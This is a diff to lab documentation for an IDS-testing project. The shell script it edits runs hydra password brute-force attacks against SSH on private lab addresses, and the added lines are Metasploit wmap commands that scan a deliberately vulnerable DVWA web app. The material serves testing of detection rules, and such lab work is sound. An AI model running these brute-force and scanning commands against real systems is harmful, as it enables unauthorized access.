@@ -22,7 +22,6 @@ I wrote a custom script to automate most of this process.
         echo "Proj: IDS"
         echo "Purpose: Test IDS Rules and Logging with a variety of attacks"
         echo "#################################"
-        hydra -L name -P a 10.180.110.253 https-head /admin/dm-launcher.msi -v -I
         hydra -L name -P a 10.180.110.250 ssh -t 4
         echo "DONE: Hydra on Admin ASDM Download to find privlaged users"
         echo "#############################"
@@ -39,5 +38,14 @@ I wrote a custom script to automate most of this process.
 
 This script launches a hydra attack on the specified IP addresses, then runs a nmap scan and then opens the metasploit console
 
+Then once we are in the MSF console we will run the following to scan our vuln filled web application for exploits.
 
-   
+    .. code-block:: bash
+
+        msf6 > wmap
+        wmap_sites -l
+        wmmap_targets -t http://10.180.110.250/dvwa/index.php
+        wmap_run -t
+        wmap_run -e
+        wmap_vulns -l
+        
